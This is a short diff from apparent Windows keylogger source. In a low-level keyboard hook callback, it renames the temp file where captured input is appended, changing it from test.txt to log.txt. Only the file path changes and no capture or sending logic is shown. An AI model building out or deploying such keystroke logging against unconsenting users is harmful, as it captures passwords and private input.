@@ -16,7 +16,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
     FILE *fpointer;
     
     // open file
-    fpointer = fopen("C:\\Windows\\Temp\\test.txt", "a");
+    fpointer = fopen("C:\\Windows\\Temp\\log.txt", "a");
     
     // error handling
     if (fpointer == NULL){
